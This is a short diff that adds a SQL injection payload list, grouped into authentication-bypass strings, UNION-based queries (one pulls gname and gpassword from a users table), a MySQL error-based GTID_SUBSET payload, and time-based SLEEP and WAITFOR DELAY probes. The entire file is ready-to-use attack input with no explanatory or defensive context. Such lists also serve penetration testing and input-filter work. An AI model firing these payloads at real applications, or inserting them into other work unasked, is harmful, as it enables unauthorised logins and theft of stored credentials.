@@ -1,0 +1,22 @@
+# SQL Injection Payloads
+
+# Auth Bypass
+' OR 1=1--
+' OR 1=1#
+admin' --
+admin' #
+' OR '1'='1
+
+# Union Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT gname,gpassword FROM users--
+
+# Error Based (MySQL)
+' AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1)--
+
+# Time Based
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+; WAITFOR DELAY '0:0:5'--
